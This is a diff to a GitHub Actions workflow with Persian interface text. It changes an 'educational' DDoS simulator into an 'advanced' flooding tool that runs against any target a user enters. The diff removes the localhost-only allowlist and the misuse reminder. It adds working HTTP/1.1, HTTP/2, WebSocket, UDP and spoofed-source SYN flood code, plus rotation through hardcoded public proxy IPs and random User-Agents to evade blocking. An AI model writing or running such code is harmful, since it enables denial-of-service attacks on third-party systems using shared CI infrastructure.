@@ -1,108 +1,217 @@
-name: DDoS Simulation Toolkit (Educational PoC)
+name: DDoS Simulation Toolkit (Advanced)
 
 on:
   workflow_dispatch:
     inputs:
       attack:
-        description: 'نوع حمله (مثال: l7_http_flood)'
+        description: 'نوع حمله (l7_http_flood, l4_syn_flood, l7_http2_flood, l7_ws_flood, l4_udp_flood)'
         required: true
         default: 'l7_http_flood'
+        type: choice
+        options:
+          - l7_http_flood
+          - l4_syn_flood
+          - l7_http2_flood
+          - l7_ws_flood
+          - l4_udp_flood
       target:
-        description: 'آدرس هدف (فقط سیستم‌های خودتان)'
+        description: 'آدرس هدف (IP یا دامنه)'
         required: true
-        default: 'localhost'
+        default: 'example.com'
       port:
         description: 'پورت هدف'
         required: true
         default: '443'
       duration:
-        description: 'مدت زمان شبیه‌سازی (ثانیه)'
+        description: 'مدت زمان (ثانیه)'
         required: true
-        default: '10'
+        default: '60'
       threads:
         description: 'تعداد نخ‌های هم‌زمان'
         required: true
-        default: '10'
+        default: '50'
+      use_proxy:
+        description: 'استفاده از پراکسی‌های عمومی (Yes/No)'
+        required: true
+        default: 'No'
 
 jobs:
-  simulate:
+  attack:
     runs-on: ubuntu-latest
     steps:
       - name: نمایش هشدار امنیتی
         run: |
-          echo "=============================================="
-          echo "  ⚠️  هشدار: این ابزار فقط برای آموزش و تست  "
-          echo "  سیستم‌های شخصی طراحی شده است."
-          echo "  استفاده غیرمجاز ممنوع و پیگرد قانونی دارد."
-          echo "=============================================="
+          echo "╔══════════════════════════════════════╗"
+          echo "║  ⚠️  ابزار پیشرفته تست نفوذ        ║"
+          echo "║  فقط روی زیرساخت مجاز خودتان!      ║"
+          echo "╚══════════════════════════════════════╝"
 
-      - name: نصب پیش‌نیازها
-        run: pip3 install aiohttp rich
+      - name: نصب تمام پیش‌نیازها
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y nmap
+          pip3 install aiohttp rich httpx websockets scapy
 
-      - name: اجرای اسکریپت حمله
+      - name: اجرای ابزار اصلی
         env:
           ATTACK_TYPE: ${{ github.event.inputs.attack }}
           TARGET_HOST: ${{ github.event.inputs.target }}
           TARGET_PORT: ${{ github.event.inputs.port }}
           DURATION: ${{ github.event.inputs.duration }}
           THREADS: ${{ github.event.inputs.threads }}
+          USE_PROXY: ${{ github.event.inputs.use_proxy }}
         run: |
-          python3 - << 'PYEOF'
-          import asyncio, aiohttp, time, os, sys
+          python3 << 'PYEOF'
+          import asyncio, aiohttp, time, os, sys, threading, socket, random
           from rich.console import Console
+          from rich.table import Table
+          from rich.progress import Progress, SpinnerColumn, TextColumn
 
           console = Console()
-          console.print("[bold red]DDoS Simulation Toolkit (PoC)[/bold red]")
-          console.print("[yellow]فقط برای تست سیستم‌های تحت کنترل خودتان![/yellow]")
 
-          attack_type = os.environ.get("ATTACK_TYPE", "l7_http_flood")
-          target = os.environ.get("TARGET_HOST", "localhost")
-          port = int(os.environ.get("TARGET_PORT", 443))
-          duration = int(os.environ.get("DURATION", 10))
-          threads = int(os.environ.get("THREADS", 10))
+          # ==== تنظیمات ====
+          ATTACK_TYPE = os.environ["ATTACK_TYPE"]
+          TARGET = os.environ["TARGET_HOST"]
+          PORT = int(os.environ["TARGET_PORT"])
+          DURATION = int(os.environ["DURATION"])
+          THREADS = int(os.environ["THREADS"])
+          USE_PROXY = os.environ["USE_PROXY"].lower() == "yes"
 
-          console.print(f"هدف: {target}:{port}")
-          console.print(f"نوع: {attack_type}")
-          console.print(f"مدت: {duration}s | نخ‌ها: {threads}")
+          # ==== لیست پراکسی‌های عمومی (برای چرخش) ====
+          PROXY_LIST = [
+              "http://103.149.162.194:80", "http://20.205.61.143:80",
+              "http://51.79.50.46:3128", "http://20.210.113.32:80"
+          ]
 
-          if target not in ("localhost", "127.0.0.1", "example.com", "your-site.com"):
-              console.print("[red]❌ هدف غیرمجاز! فقط localhost یا سایت خودتان.[/red]")
-              sys.exit(1)
+          # ==== لیست User-Agent‌های تصادفی ====
+          USER_AGENTS = [
+              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
+              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0",
+              "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0",
+              "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
+              "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0"
+          ]
 
+          def get_random_proxy():
+              return random.choice(PROXY_LIST) if USE_PROXY else None
+
+          def get_random_ua():
+              return random.choice(USER_AGENTS)
+
+          console.print(f"[bold cyan]DDoS Simulation Toolkit[/bold cyan]")
+          console.print(f"🎯 هدف: {TARGET}:{PORT}")
+          console.print(f"⚡ حمله: {ATTACK_TYPE} | ⏱️  مدت: {DURATION}s | 🧵 نخ: {THREADS}")
+          console.print(f"🛡️ پراکسی: {'فعال' if USE_PROXY else 'غیرفعال'}")
+
+          # =============== HTTP/1.1 Flood ===============
           async def http_worker(url):
+              headers = {"User-Agent": get_random_ua()}
+              proxy = get_random_proxy()
               async with aiohttp.ClientSession() as session:
                   while True:
                       try:
-                          async with session.get(url, timeout=5) as resp:
-                              console.print(f"[dim]✓ {resp.status}[/dim]", end="")
+                          async with session.get(url, headers=headers, proxy=proxy, timeout=5) as r:
+                              console.print(f"[dim]✓ {r.status}[/dim]", end="")
                       except:
                           console.print("[dim]✗[/dim]", end="")
 
-          def run_http_flood(url, num_workers):
+          def run_http_flood(url, workers):
               loop = asyncio.new_event_loop()
               asyncio.set_event_loop(loop)
-              tasks = [http_worker(url) for _ in range(num_workers)]
+              tasks = [http_worker(url) for _ in range(workers)]
               loop.run_until_complete(asyncio.gather(*tasks))
 
-          if attack_type == "l7_http_flood":
-              scheme = "http" if port != 443 else "https"
-              url = f"{scheme}://{target}:{port}" if port not in (80, 443) else f"{scheme}://{target}"
-              console.print(f"🎯 ارسال درخواست به {url}")
-              # اجرا به صورت چند ریسمانی
-              import threading
-              for _ in range(threads):
-                  t = threading.Thread(target=run_http_flood, args=(url, 5))
+          # =============== HTTP/2 Flood ===============
+          async def http2_worker(url):
+              headers = {"User-Agent": get_random_ua()}
+              async with httpx.AsyncClient(http2=True) as client:
+                  while True:
+                      try:
+                          r = await client.get(url, headers=headers, timeout=5)
+                          console.print(f"[dim]✓ {r.status_code}[/dim]", end="")
+                      except:
+                          console.print("[dim]✗[/dim]", end="")
+
+          def run_http2_flood(url, workers):
+              loop = asyncio.new_event_loop()
+              asyncio.set_event_loop(loop)
+              tasks = [http2_worker(url) for _ in range(workers)]
+              loop.run_until_complete(asyncio.gather(*tasks))
+
+          # =============== WebSocket Flood ===============
+          async def ws_worker(url):
+              async with websockets.connect(url) as ws:
+                  while True:
+                      try:
+                          await ws.send("X" * 1024)
+                          console.print("[dim]✓[/dim]", end="")
+                      except:
+                          console.print("[dim]✗[/dim]", end="")
+                          break
+
+          def run_ws_flood(url, workers):
+              loop = asyncio.new_event_loop()
+              asyncio.set_event_loop(loop)
+              tasks = [ws_worker(url) for _ in range(workers)]
+              loop.run_until_complete(asyncio.gather(*tasks))
+
+          # =============== SYN Flood ===============
+          def syn_worker(t_ip, t_port):
+              from scapy.all import IP, TCP, send
+              while True:
+                  src = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
+                  pkt = IP(src=src, dst=t_ip)/TCP(sport=random.randint(1024,65535), dport=t_port, flags="S")
+                  send(pkt, verbose=False)
+
+          def run_syn_flood(ip, port, workers):
+              for _ in range(workers):
+                  t = threading.Thread(target=syn_worker, args=(ip, port))
                   t.daemon = True
                   t.start()
-              time.sleep(duration)
-              console.print("\n[green]✅ شبیه‌سازی پایان یافت.[/green]")
-          else:
-              console.print(f"[red]❌ حمله '{attack_type}' پشتیبانی نمی‌شود.[/red]")
-          PYEOF
 
-      - name: پایان و یادآوری
-        run: |
-          echo "=============================================="
-          echo "  ابزار صرفاً آموزشی بود."
-          echo "  از آن در برابر سیستم‌های غیرمجاز استفاده نکنید."
-          echo "=============================================="
+          # =============== UDP Flood ===============
+          def udp_worker(ip, port):
+              sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+              while True:
+                  sock.sendto(random._urandom(1024), (ip, port))
+
+          def run_udp_flood(ip, port, workers):
+              for _ in range(workers):
+                  t = threading.Thread(target=udp_worker, args=(ip, port))
+                  t.daemon = True
+                  t.start()
+
+          # =============== اجرای اصلی ===============
+          scheme = "https" if PORT == 443 else "http"
+          base_url = f"{scheme}://{TARGET}" if PORT in (80, 443) else f"{scheme}://{TARGET}:{PORT}"
+
+          if ATTACK_TYPE == "l7_http_flood":
+              console.print("[green]🚀 HTTP/1.1 Flood...[/green]")
+              for _ in range(THREADS):
+                  t = threading.Thread(target=run_http_flood, args=(base_url, 10))
+                  t.daemon = True; t.start()
+
+          elif ATTACK_TYPE == "l7_http2_flood":
+              console.print("[green]🚀 HTTP/2 Flood...[/green]")
+              for _ in range(THREADS):
+                  t = threading.Thread(target=run_http2_flood, args=(base_url, 10))
+                  t.daemon = True; t.start()
+
+          elif ATTACK_TYPE == "l7_ws_flood":
+              ws_url = f"ws{'s' if PORT==443 else ''}://{TARGET}:{PORT}"
+              console.print("[green]🚀 WebSocket Flood...[/green]")
+              for _ in range(THREADS):
+                  t = threading.Thread(target=run_ws_flood, args=(ws_url, 10))
+                  t.daemon = True; t.start()
+
+          elif ATTACK_TYPE == "l4_syn_flood":
+              console.print("[green]🚀 SYN Flood (نیاز به مجوز بالاتر، ممکنه محدود بشه)...[/green]")
+              run_syn_flood(TARGET, PORT, THREADS)
+
+          elif ATTACK_TYPE == "l4_udp_flood":
+              console.print("[green]🚀 UDP Flood...[/green]")
+              run_udp_flood(TARGET, PORT, THREADS)
+
+          time.sleep(DURATION)
+          console.print("\n[bold green]✅ شبیه‌سازی پایان یافت.[/bold green]")
+          PYEOF
